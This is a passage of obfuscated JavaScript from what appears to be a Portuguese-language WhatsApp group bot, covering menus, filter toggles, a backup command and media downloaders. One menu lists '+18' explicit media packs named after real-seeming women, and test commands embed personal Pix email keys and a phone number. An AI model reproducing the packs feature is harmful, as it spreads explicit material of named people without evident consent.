                  title: '' + (!_0x51d731 ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐍𝐎𝐓𝐀 𝐅𝐀𝐊𝐄 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐍𝐎𝐓𝐀 𝐅𝐀𝐊𝐄 ❌"),
                  id: '' + (!_0x51d731 ? "antinotas 1" : "antinotas 0"),
                  stts: '' + (!_0x51d731 ? "Ativar" : "Desativar")
                };
                const _0x547112 = {
                  title: '' + (!_0x2e49b2 ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐅𝐀𝐊𝐄 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐅𝐀𝐊𝐄 ❌"),
                  id: '' + (!_0x2e49b2 ? "antifake 1" : "antifake 0"),
                  stts: '' + (!_0x2e49b2 ? "Ativar" : "Desativar")
                };
                const _0x164c13 = {
                  title: '' + (!_0x52e919 ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐂𝐀𝐓𝐀́𝐋𝐎𝐆𝐎 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐂𝐀𝐓𝐀́𝐋𝐎𝐆𝐎 ❌"),
                  id: '' + (!_0x52e919 ? "anticatalogo 1" : "anticatalogo 0"),
                  stts: '' + (!_0x52e919 ? "Ativar" : "Desativar")
                };
                const _0x1e2440 = {
                  title: '' + (!_0x2ac64a ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐋𝐎𝐂𝐀𝐋𝐈𝐙𝐀𝐂̧𝐀̃𝐎 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐋𝐎𝐂𝐀𝐋𝐈𝐙𝐀𝐂̧𝐀̃𝐎 ❌"),
                  id: '' + (!_0x2ac64a ? "antiloc 1" : "antiloc 0"),
                  stts: '' + (!_0x2ac64a ? "Ativar" : "Desativar")
                };
                const _0x5b6383 = {
                  title: '' + (!_0xc01de ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐕𝐈𝐒𝐔 𝐔́𝐍𝐈𝐂𝐀 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐕𝐈𝐒𝐔 𝐔́𝐍𝐈𝐂𝐀 ❌"),
                  id: '' + (!_0xc01de ? "x9visuunica 1" : "x9visuunica 0"),
                  stts: '' + (!_0xc01de ? "Ativar" : "Desativar")
                };
                const _0x49fc64 = {
                  title: '' + (!_0x14171f ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐕𝐈𝐃𝐄𝐎 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐕𝐈𝐃𝐄𝐎 ❌"),
                  id: '' + (!_0x14171f ? "antivideo 1" : "antivideo 0"),
                  stts: '' + (!_0x14171f ? "Ativar" : "Desativar")
                };
                const _0x137c4d = {
                  title: '' + (!_0x2ddc0a ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐈𝐌𝐀𝐆𝐄𝐌 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐈𝐌𝐀𝐆𝐄𝐌 ❌"),
                  id: '' + (!_0x2ddc0a ? "antiimg 1" : "antiimg 0"),
                  stts: '' + (!_0x2ddc0a ? "Ativar" : "Desativar")
                };
                const _0x456f7a = {
                  title: '' + (!_0x1b617c ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐀𝐔𝐃𝐈𝐎 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐀𝐔𝐃𝐈𝐎 ❌"),
                  id: '' + (!_0x1b617c ? "antiaudio 1" : "antiaudio 0"),
                  stts: '' + (!_0x1b617c ? "Ativar" : "Desativar")
                };
                const _0x2b1ed0 = {
                  title: '' + (!_0x5aaef2 ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐃𝐎𝐂𝐔𝐌𝐄𝐍𝐓𝐎 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐃𝐎𝐂𝐔𝐌𝐄𝐍𝐓𝐎 ❌"),
                  id: '' + (!_0x5aaef2 ? "antidoc 1" : "antidoc 0"),
                  stts: '' + (!_0x5aaef2 ? "Ativar" : "Desativar")
                };
                const _0x1c6eeb = {
                  title: '' + (!_0x17cef7 ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐂𝐎𝐍𝐓𝐀𝐓𝐎 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐂𝐎𝐍𝐓𝐀𝐓𝐎 ❌"),
                  id: '' + (!_0x17cef7 ? "anticontato 1" : "anticontato 0"),
                  stts: '' + (!_0x17cef7 ? "Ativar" : "Desativar")
                };
                const _0x1984da = {
                  title: '' + (!_0x48bcb9 ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐎 𝐀𝐍𝐓𝐈 𝐒𝐏𝐀𝐌 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐎 𝐀𝐍𝐓𝐈 𝐒𝐏𝐀𝐌 ❌"),
                  id: '' + (!_0x48bcb9 ? "antispam 1" : "antispam 0"),
                  stts: '' + (!_0x48bcb9 ? "Ativar" : "Desativar")
                };
                const _0x3a33ae = {
                  title: '' + (!_0x1a72a5 ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀 ❌"),
                  id: '' + (!_0x1a72a5 ? "antisticker 1" : "antisticker 0"),
                  stts: '' + (!_0x1a72a5 ? "Ativar" : "Desativar")
                };
                const _0x39b954 = {
                  title: '' + (!_0x29ccfb ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐔𝐓𝐎 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐔𝐓𝐎 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀 ❌"),
                  id: '' + (!_0x29ccfb ? "autofigu 1" : "autofigu 0"),
                  stts: '' + (!_0x29ccfb ? "Ativar" : "Desativar")
                };
                const _0x3e4298 = {
                  title: '' + (!_0x5a94ec ? "✅ 𝐀𝐔𝐓𝐎 𝐑𝐄𝐒𝐏𝐎𝐒𝐓𝐀 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐔𝐓𝐎 𝐑𝐄𝐒𝐏𝐎𝐒𝐓𝐀 ❌"),
                  id: '' + (!_0x5a94ec ? "autoresposta 1" : "autoresposta 0"),
                  stts: '' + (!_0x5a94ec ? "Ativar" : "Desativar")
                };
                const _0x1743a3 = {
                  title: '' + (!_0x16ba85 ? "✅ 𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐌𝐀𝐑𝐂𝐀𝐂̧𝐎̃𝐄𝐒 ✅" : "❌ 𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈 𝐌𝐀𝐑𝐂𝐀𝐂̧𝐎̃𝐄𝐒 ❌"),
                  id: '' + (!_0x16ba85 ? "antimarc 1" : "antimarc 0"),
                  stts: '' + (!_0x16ba85 ? "Ativar" : "Desativar")
                };
                const _0x2dbc8c = {
                  title: "Boa sorte... Obg por usar " + NomeDoBot,
                  id: "bot",
                  descrip: "Comandos de *Ativar* e *Desativar*.."
                };
                let _0x3206a5 = [_0x15b306, _0x494d8a, _0x215143, _0x1bbf2b, _0x32f143, _0x4ee194, _0x598cf4, _0x16d7f9, _0x314ab5, _0xe433b, _0x210506, _0x656835, _0x4eeac5, _0x3c7193, _0x547112, _0x164c13, _0x1e2440, _0x5b6383, _0x49fc64, _0x137c4d, _0x456f7a, _0x2b1ed0, _0x1c6eeb, _0x1984da, _0x3a33ae, _0x39b954, _0x3e4298, _0x1743a3, _0x2dbc8c];
                txtlista = _0x2cd689 + " Lista De Ativações " + _0x2cd689 + "\nAdministrador: " + _0x671b4b + "\nAtive *Conscientemente* o que Desejar..";
                txtbotao = _0x2cd689 + " Lista de Funções.. " + _0x2cd689;
                _0x58c3cd(_0x346d97, txtbotao, txtlista, _0x141936, _0x3206a5);
              }
              break;
            case "menuuu2":
              const _0x4abf6d = {
                title: "MENU COMPLETO",
                id: "menup"
              };
              const _0x1e9ff9 = {
                title: "MENU PREMIUM",
                id: "menupremium"
              };
              options = [_0x4abf6d, _0x1e9ff9];
              txtbotao = "txtbotao";
              txtlista = "texto";
              _0x58c3cd(_0x346d97, txtbotao, txtlista, _0x141936, options);
              break;
            case "listadepacksts":
              const _0x2fb827 = {
                title: "🔞 𝐀𝐋𝐈𝐍𝐄 𝐅𝐀𝐑𝐈𝐀 🔞",
                id: "packalinefaria"
              };
              const _0x2aa4fa = {
                title: "🔞 𝐀𝐋𝐈𝐍𝐄 𝐅𝐎𝐗 🔞",
                id: "packalinefox"
              };
              const _0xcc563b = {
                title: "🔞 𝐓𝐀𝐓𝐈𝐙𝐀𝐐𝐔𝐈 🔞",
                id: "packtati"
              };
              const _0x365788 = {
                title: "🔞 𝐀𝐋𝐘𝐂𝐈𝐀 𝐑𝐈𝐁𝐄𝐈𝐑𝐎 🔞",
                id: "packalycia"
              };
              const _0x361116 = {
                title: "🔞 𝐀𝐌𝐈𝐈𝐂𝐇𝐀𝐍 🔞",
                id: "packamiichan"
              };
              const _0x3a7e33 = {
                title: "🔞 𝐀𝐍𝐈𝐍𝐇𝐀 𝐋𝐎𝐏𝐄𝐒 🔞",
                id: "packaninhal"
              };
              const _0x486fca = {
                title: "🔞 𝐁𝐀𝐁𝐘 𝐌𝐀𝐓𝐎𝐒𝐎 🔞",
                id: "packbabymatoso"
              };
              const _0x1d19b4 = {
                title: "🔞 𝐁𝐄𝐋𝐋𝐄 𝐃𝐄𝐋𝐏𝐇𝐈𝐍𝐄 🔞",
                id: "packbelledel"
              };
              const _0x315405 = {
                title: "🔞 𝐁𝐑𝐄𝐍𝐃𝐀 𝐓𝐑𝐈𝐍𝐃𝐀𝐃𝐄 🔞",
                id: "packbrendat"
              };
              const _0x4f320f = {
                title: "🔞 𝐂𝐀𝐌𝐈 𝐁𝐑𝐈𝐓𝐎 🔞",
                id: "packcamib"
              };
              const _0x2566ad = {
                title: "🔞 𝐂𝐂𝐋𝐎𝐖𝐍𝐈𝐀𝐂 🔞",
                id: "packcclowniac"
              };
              const _0x2ad078 = {
                title: "🔞 𝐅𝐄𝐇𝐆𝐀𝐋𝐕𝐀𝐎 🔞",
                id: "packfehg"
              };
              const _0x1c7444 = {
                title: "🔞 𝐆𝐈𝐎𝐕𝐀𝐍𝐍𝐀 𝐂𝐀𝐌𝐏𝐎𝐌𝐀𝐑 🔞",
                id: "packgiovannac"
              };
              const _0x417f3a = {
                title: "🔞 𝐈𝐒𝐀𝐃𝐎𝐑𝐀 𝐌𝐀𝐑𝐓𝐈𝐍𝐄𝐙 🔞",
                id: "packisadoram"
              };
              const _0x29a9e5 = {
                title: "🔞 𝐈𝐒𝐀 𝐖𝐀𝐈𝐅𝐔 🔞",
                id: "packisaw"
              };
              const _0x43c49f = {
                title: "🔞 𝐋𝐀𝐘 𝐍𝐔𝐍𝐈𝐙 🔞",
                id: "packlayn"
              };
              const _0x552cb9 = {
                title: "🔞 𝐋𝐄𝐓𝐈𝐂𝐈𝐀 𝐒𝐇𝐈𝐑𝐀𝐘𝐔𝐊𝐈 🔞",
                id: "packleticias"
              };
              const _0x5834e7 = {
                title: "🔞 𝐌𝐀𝐑𝐈𝐍𝐀 𝐌𝐔𝐈 🔞",
                id: "packmarinam"
              };
              const _0x3d8d73 = {
                title: "🔞 𝐌𝐀𝐑𝐔 𝐊𝐀𝐑𝐕 🔞",
                id: "packmaruk"
              };
              const _0x13f7e0 = {
                title: "🔞 𝐌𝐂 𝐏𝐑𝐈𝐍𝐂𝐄𝐒𝐀 🔞",
                id: "packmcpri"
              };
              const _0x376953 = {
                title: "🔞 𝐌𝐄1𝐀𝐃𝐈𝐍𝐇𝐀 🔞",
                id: "packme1adinha"
              };
              const _0x3991e6 = {
                title: "🔞 𝐍𝐀𝐓𝐇 𝐁𝐈𝐒𝐓𝐄𝐑𝐂̧𝐎 🔞",
                id: "packnathb"
              };
              const _0x3277f5 = {
                title: "🔞 𝐍𝐄𝐆𝐀 𝐁𝐀𝐑𝐁𝐈𝐄 🔞",
                id: "packnegab"
              };
              const _0x184c0f = {
                title: "🔞 𝐏𝐎𝐋𝐎𝐍𝐄𝐒𝐀 𝐃𝐎 𝐇𝐘𝐏𝐄 🔞",
                id: "packpolonesa"
              };
              const _0x5950f9 = {
                title: "🔞 𝐑𝐔𝐓𝐄 𝐑𝐎𝐂𝐇𝐀 🔞",
                id: "packruter"
              };
              const _0x15b63d = {
                title: "🔞 𝐕𝐈𝐓𝐀 𝐂𝐄𝐋𝐄𝐒𝐓𝐈𝐍𝐄 🔞",
                id: "packvitac"
              };
              const _0x22fbd0 = {
                title: "🔞 𝐂𝐀𝐑𝐍𝐈𝐄𝐋𝐋𝐎 🔞",
                id: "packcarniello"
              };
              const _0x139ee6 = {
                title: "🔞 𝐍𝐄𝐓𝐄𝐑𝐒𝐆 🔞",
                id: "packnetersg"
              };
              const _0x567e9f = {
                title: "🔞 𝙀𝙂𝙍𝙄𝙇𝙎 🔞",
                id: "packegrils"
              };
              const _0x48b5b2 = {
                title: "🔞 𝙀𝙂𝙍𝙄𝙇𝙎 𝐕𝐈́𝐃𝐄𝐎𝐒 🔞",
                id: "packegrilv"
              };
              const _0x5652b8 = {
                title: "🔞 𝐅𝐎𝐓𝐎𝐒 𝐀𝐋𝐄𝐀𝐓𝐎́𝐑𝐈𝐀𝐒 🔞",
                id: "packaleatoriasi"
              };
              const _0x3c9d7e = {
                title: "🔞 𝐕𝐈́𝐃𝐄𝐎𝐒 𝐀𝐋𝐄𝐀𝐓𝐎́𝐑𝐈𝐎 🔞",
                id: "packaleatoriosv"
              };
              const _0x24cc04 = {
                title: "🔞 𝐕𝐈́𝐃𝐄𝐎𝐒 𝐎𝐍𝐋𝐘𝐅𝐀𝐍𝐒 🔞",
                id: "packonlyvid"
              };
              const _0x46af0b = {
                title: "🔞 𝐕𝐈́𝐃𝐄𝐎𝐒 𝐀𝐌𝐀𝐃𝐎𝐑 🔞",
                id: "packamadorv"
              };
              options = [_0x2fb827, _0x2aa4fa, _0xcc563b, _0x365788, _0x361116, _0x3a7e33, _0x486fca, _0x1d19b4, _0x315405, _0x4f320f, _0x2566ad, _0x2ad078, _0x1c7444, _0x417f3a, _0x29a9e5, _0x43c49f, _0x552cb9, _0x5834e7, _0x3d8d73, _0x13f7e0, _0x376953, _0x3991e6, _0x3277f5, _0x184c0f, _0x5950f9, _0x15b63d, _0x22fbd0, _0x139ee6, _0x567e9f, _0x48b5b2, _0x5652b8, _0x3c9d7e, _0x24cc04, _0x46af0b];
              await _0x58c3cd(_0x346d97, "🔞 𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐏𝐀𝐂𝐊𝐒 🔞", "𝐀𝐐𝐔𝐈 𝐄𝐒𝐓𝐀́ 𝐌𝐈𝐍𝐇𝐀 𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐏𝐀𝐂𝐊𝐒", _0x141936, options);
              break;
            case "menuuu":
              const _0x4706b1 = {
                text: "\n╭╍❆╍━━⊰❆̸💎❆̸⊱━━╍❆╍╮\n┃❆̸̸͙⃰ ⃝⃔͜💎 𝐌𝐄𝐍𝐔     💎̸͙ ⃝̸̸⃔͜❆̸͙⃰⃰\n╰╍❆╍━━⊰❆̸💎❆̸⊱━━╍❆╍╯"
              };
              await _0x5196be.relayMessage(_0x346d97, {
                'interactiveMessage': {
                  'body': _0x4706b1,
                  'nativeFlowMessage': {
                    'buttons': [{
                      'name': "single_select",
                      'buttonParamsJson': JSON.stringify({
                        'title': "𝐌𝐄𝐍𝐔𝐒",
                        'sections': [{
                          'title': '',
                          'rows': [{
                            'header': '',
                            'title': "MENU COMPLETO",
                            'description': '',
                            'id': _0x141936 + "menup"
                          }, {
                            'header': '',
                            'title': "MENU PREMIUM",
                            'description': '',
                            'id': _0x141936 + "menupremium"
                          }, {
                            'header': '',
                            'title': "EFEITOS",
                            'description': '',
                            'id': _0x141936 + "efeitosimg"
                          }, {
                            'header': '',
                            'title': "LOGOS",
                            'description': '',
                            'id': _0x141936 + "logos"
                          }, {
                            'header': '',
                            'title': "ANIMES",
                            'description': '',
                            'id': _0x141936 + "animes"
                          }, {
                            'header': '',
                            'title': "PESQUISAS & APKS",
                            'description': '',
                            'id': _0x141936 + "menudw"
                          }, {
                            'header': '',
                            'title': "FIGURINHAS",
                            'description': '',
                            'id': _0x141936 + "menufig"
                          }, {
                            'header': '',
                            'title': "BRINCADEIRAS",
                            'description': '',
                            'id': _0x141936 + "brincadeiras"
                          }, {
                            'header': '',
                            'title': "MENU GOLD",
                            'description': '',
                            'id': _0x141936 + "menugold"
                          }, {
                            'header': '',
                            'title': "MENU ADM",
                            'description': '',
                            'id': _0x141936 + "menuadm"
                          }, {
                            'header': '',
                            'title': "MENU DONO",
                            'description': '',
                            'id': _0x141936 + "menudono"
                          }]
                        }]
                      })
                    }],
                    'messageParamsJson': ''
                  }
                }
              }, {}).then(_0x416c56 => console.log(_0x416c56));
              break;
            case "botao":
            case "botoes":
              if (!_0xf59944) {
                return _0x50740b(enviar.msg.donosmt);
              }
              if (!_0x42316a) {
                nescessario.botoes = true;
                _0x13c255(nescessario);
                _0x50740b("- Os Botões foi ativado _- COM SUCESSO - _\n\nSe quiser Desativar - Só digitar o comando novamente");
              } else if (_0x42316a) {
                nescessario.botoes = false;
                _0x13c255(nescessario);
                _0x50740b("- Os Botões foi Desativado  _- COM SUCESSO - _\n\nSe quiser Ativar - Só digitar o comando novamente");
              }
              break;
            case "menu":
              {
                const _0x205f84 = {
                  stts: 'on',
                  title: _0x2cd689 + "️ 𝐌𝐄𝐍𝐔 𝐏𝐑𝐈𝐍𝐂𝐈𝐏𝐀𝐋 " + _0x2cd689,
                  id: "menu2"
                };
                const _0xb3a527 = {
                  title: "🖼️ 𝐌𝐄𝐍𝐔 𝐋𝐎𝐆𝐎𝐒 🖼",
                  id: "menulogos"
                };
                const _0x34faf3 = {
                  title: "🪬 𝐌𝐄𝐍𝐔 𝐃𝐄 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒 🪬",
                  id: "menufig"
                };
                const _0x384a50 = {
                  title: "🗣️ 𝐌𝐄𝐍𝐔 𝐃𝐄 𝐀𝐋𝐓𝐄𝐑𝐀𝐃𝐎𝐑𝐄𝐒 🗣️",
                  id: "alteradores"
                };
                const _0x1eb799 = {
                  title: "💥 𝐌𝐄𝐍𝐔 𝐃𝐄 𝐄𝐅𝐄𝐈𝐓𝙾𝐒 💥",
                  id: "efeitos"
                };
                const _0x3674e7 = {
                  title: "💎 𝐌𝐄𝐍𝐔 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 💎",
                  id: "menuprem"
                };
                const _0x395bfa = {
                  title: "🥳 𝐌𝐄𝐍𝐔 𝐃𝐄 𝐁𝐑𝐈𝐍𝐂𝐀𝐃𝐄𝐈𝐑𝐀𝐒 🪅",
                  id: "brincadeiras"
                };
                const _0x2f531b = {
                  title: "🔎 𝐌𝐄𝐍𝐔 𝐃𝐄 𝐏𝐄𝐒𝐐𝐔𝐈𝐒𝐀/𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 🎦",
                  id: "menudw"
                };
                const _0x22e791 = {
                  title: "👾 𝐌𝐄𝐍𝐔 𝐃𝐄 𝐉𝐎𝐆𝐎𝐒 𝐀𝐏𝐊𝐬 👾",
                  id: "listadejogos"
                };
                const _0x5dc6c5 = {
                  title: "🇯🇵 𝐌𝐄𝐍𝐔 𝐃𝐄 𝐀𝐍𝐈𝐌𝐄𝐒 🎌",
                  id: "menuanime"
                };
                const _0x236756 = {
                  title: '' + (!_0x2f3424 ? "🚫 𝐌𝐄𝐍𝐔 𝐎𝐂𝐔𝐋𝐓𝐀𝐃𝐎 🚫" : "🔞 𝐌𝐄𝐍𝐔 +18 🔞"),
                  id: "menu18"
                };
                const _0x29211d = {
                  title: "👮‍♂️ 𝐌𝐄𝐍𝐔 𝐃𝐄 𝐀𝐃𝐌𝐒 👮",
                  id: "menuadm"
                };
                const _0x4df5c5 = {
                  stts: "SO DONO",
                  title: "👑 𝐌𝐄𝐍𝐔 𝐃𝐎 𝐃𝐎𝐍𝐎 👑",
                  id: "Menudono"
                };
                const _0x36d733 = {
                  title: "🛠️ 𝐏𝐑𝐎𝐏𝐑𝐈𝐄𝐓𝐀́𝐑𝐈𝐎 🛠️",
                  id: "infodono"
                };
                const _0x40beaa = {
                  title: "🛠️ 𝐂𝐑𝐈𝐀𝐃𝐎𝐑 𝐃𝐎 𝐁𝐎𝐓 🤴🏼",
                  id: "criador"
                };
                let _0x3cc6f1 = [_0x205f84, _0xb3a527, _0x34faf3, _0x384a50, _0x1eb799, _0x3674e7, _0x395bfa, _0x2f531b, _0x22e791, _0x5dc6c5, _0x236756, _0x29211d, _0x4df5c5, _0x36d733, _0x40beaa];
                txtlista = _0x2cd689 + " 𝐎𝐋𝐀́ 𝐀𝐐𝐔𝐈 𝐄𝐒𝐓𝐀́ 𝐌𝐈𝐍𝐇𝐀 𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐂𝐎𝐌𝐀𝐍𝐃𝐎𝐒 " + _0x2cd689;
                txtbotao = _0x2cd689 + "️ 𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐂𝐎𝐌𝐀𝐍𝐃𝐎𝐒 " + _0x2cd689;
                _0x58c3cd(_0x346d97, txtbotao, txtlista, _0x141936, _0x3cc6f1);
              }
              break;
            case "backupbot":
              {
                if (!_0xf59944 && !_0xd2050d.key.fromMe) {
                  return _0x50740b("Este comando só o bot ou o dono pode executar..");
                }
                const _0x29e64d = {
                  maxBuffer: 10485760
                };
                exec("zip -r ESDEATH-BACKUP.zip DADOS dono", _0x29e64d, (_0xa4df57, _0x33e5bc) => {
                  if (_0xa4df57) {
                    console.error("Erro durante o processo de compressão:", _0xa4df57);
                    _0x50740b("ERRO!! Falha na compressão do arquivo. Detalhes do erro: " + _0xa4df57.message);
                  } else {
                    const _0x52b4f9 = {
                      url: "./ESDEATH-BACKUP.zip"
                    };
                    const _0x106d5d = {
                      document: _0x52b4f9,
                      fileName: "ESDEATH-BACKUP.zip",
                      mimetype: "application/zip"
                    };
                    const _0x3f3b7f = {
                      quoted: _0xd2050d
                    };
                    _0x5196be.sendMessage(_0x346d97, _0x106d5d, _0x3f3b7f).then(() => {
                      fs.unlinkSync("./ESDEATH-BACKUP.zip");
                    })["catch"](_0x17c34b => {
                      console.error("Erro ao enviar o arquivo:", _0x17c34b);
                      _0x50740b("ERRO!! Falha ao enviar o arquivo.");
                    });
                  }
                });
              }
              break;
            case "testeb3":
              const _0x50ac73 = {
                upload: _0x5196be.waUploadToServer
              };
              let _0xe2bb92 = await prepareWAMessageMedia({
                'image': fs.readFileSync("./img.jpg")
              }, _0x50ac73);
              const _0x4dd723 = {
                deviceListMetadataVersion: 0x2,
                deviceListMetadata: {}
              };
              const _0x156486 = {
                title: "Menu",
                subtitle: "Menu completo",
                hasMediaAttachment: true,
                imageMessage: _0xe2bb92.imageMessage
              };
              const _0x48cb1c = {
                text: "teste"
              };
              const _0x2478d1 = {
                title: "cmd 2",
                id: "&ping2"
              };
              const _0x574402 = {
                value: 0x0,
                offset: 0x64
              };
              const _0x231172 = {
                value: 0x0,
                offset: 0x64
              };
              const _0x4917e2 = {
                value: 0x0,
                offset: 0x64
              };
              const _0x51b62d = {
                value: 0x0,
                offset: 0x64
              };
              const _0x5e6349 = {
                name: '',
                amount: _0x4917e2,
                quantity: 0x0,
                sale_amount: _0x51b62d
              };
              await _0x5196be.relayMessage(_0x346d97, {
                'botInvokeMessage': {
                  'message': {
                    'messageContextInfo': _0x4dd723,
                    'interactiveMessage': {
                      'header': _0x156486,
                      'headerType': "IMAGE",
                      'body': _0x48cb1c,
                      'nativeFlowMessage': {
                        'buttons': [{
                          'name': "single_select",
                          'buttonParamsJson': JSON.stringify({
                            'title': "lotus gostoso",
                            'sections': [{
                              'title': "aaaa",
                              'highlight_label': "abbbb",
                              'rows': [_0x2478d1]
                            }]
                          })
                        }, {
                          'name': "quick_reply",
                          'buttonParamsJson': JSON.stringify({
                            'display_text': "PING",
                            'id': "&ping2",
                            'disabled': false
                          })
                        }, {
                          'name': "payment_info",
                          'buttonParamsJson': JSON.stringify({
                            'currency': "BRL",
                            'total_amount': _0x574402,
                            'reference_id': "4P766X24OPT",
                            'type': "physical-goods",
                            'order': {
                              'status': "pending",
                              'subtotal': _0x231172,
                              'order_type': "ORDER",
                              'items': [_0x5e6349]
                            },
                            'payment_settings': [{
                              'type': "pix_static_code",
                              'pix_static_code': {
                                'merchant_name': "Josival Ribeiro",
                                'key': "josivalalvinho@gmail.com",
                                'key_type': "EMAIL"
                              }
                            }]
                          })
                        }],
                        'messageParamsJson': ''
                      }
                    }
                  }
                }
              }, {}).then(_0x8357c5 => console.log(_0x8357c5));
              break;
            case "testeb2":
              const _0x4835b7 = {
                text: "xablau"
              };
              const _0x421459 = {
                text: "lotus big gostoso"
              };
              const _0x52d532 = {
                participant: _0x246d48,
                quotedMessage: _0xd2050d
              };
              const _0x5a0c1f = {
                value: 0x0,
                offset: 0x64
              };
              const _0x2ac04d = {
                value: 0x0,
                offset: 0x64
              };
              const _0x23720f = {
                value: 0x0,
                offset: 0x64
              };
              const _0x42d4ab = {
                value: 0x0,
                offset: 0x64
              };
              const _0x17b3e3 = {
                name: '',
                amount: _0x23720f,
                quantity: 0x0,
                sale_amount: _0x42d4ab
              };
              _0x5196be.relayMessage(_0x346d97, {
                'interactiveMessage': {
                  'body': _0x4835b7,
                  'footer': _0x421459,
                  'contextInfo': _0x52d532,
                  'nativeFlowMessage': {
                    'buttons': [{
                      'name': "payment_info",
                      'buttonParamsJson': JSON.stringify({
                        'currency': "BRL",
                        'total_amount': _0x5a0c1f,
                        'reference_id': "4P76CHH314H",
                        'type': "physical-goods",
                        'order': {
                          'status': "pending",
                          'subtotal': _0x2ac04d,
                          'order_type': "ORDER",
                          'items': [_0x17b3e3]
                        },
                        'payment_settings': [{
                          'type': "pix_static_code",
                          'pix_static_code': {
                            'merchant_name': "PIX DO LOTUS",
                            'key': "botesdeath@gmail.com",
                            'key_type': "EMAIL"
                          }
                        }]
                      })
                    }],
                    'messageParamsJson': ''
                  }
                }
              }, {});
              break;
            case "testeb":
              const _0x2644c = {
                text: "Teste"
              };
              const _0x1f01f0 = {
                text: "Lotus </>"
              };
              const _0x36b563 = {
                participant: _0x246d48,
                quotedMessage: _0xd2050d
              };
              const _0x2e2b02 = {
                title: "cmd 2",
                id: "&ping2"
              };
              const _0x2b9540 = {
                messageId: _0xd2050d.key.id
              };
              _0x5196be.relayMessage(_0x346d97, {
                'interactiveMessage': {
                  'body': _0x2644c,
                  'footer': _0x1f01f0,
                  'contextInfo': _0x36b563,
                  'nativeFlowMessage': {
                    'buttons': [{
                      'name': "single_select",
                      'buttonParamsJson': JSON.stringify({
                        'title': "tudo pra isso tokyo?",
                        'sections': [{
                          'title': "aaaa",
                          'highlight_label': "abbbb",
                          'rows': [_0x2e2b02]
                        }]
                      })
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': JSON.stringify({
                        'display_text': "Fale Com O Lotus",
                        'url': "https://wa.me/5521995400244",
                        'merchant_url': "https://wa.me/5521995400244"
                      })
                    }, {
                      'name': "cta_copy",
                      'buttonParamsJson': JSON.stringify({
                        'display_text': "teste",
                        'id': "não",
                        'copy_code': '' + _0x671b4b
                      })
                    }]
                  }
                }
              }, _0x2b9540);
              break;
            case "kwai":
              {
                if (!_0x11e99e.trim().includes("kwai")) {
                  return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " LINK DO KWAI");
                }
                _0x50740b(_0x50f430);
                try {
                  const _0x27d34b = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, {
                    'video': {
                      'url': reqapi.kwai_mp4(_0x11e99e.trim())
                    },
                    'mimetype': "video/mp4"
                  }, _0x27d34b);
                } catch {
                  return _0x50740b("Erro...");
                }
              }
              break;
            case "spotify2":
              {
                if (!_0x11e99e.trim().includes("spotify")) {
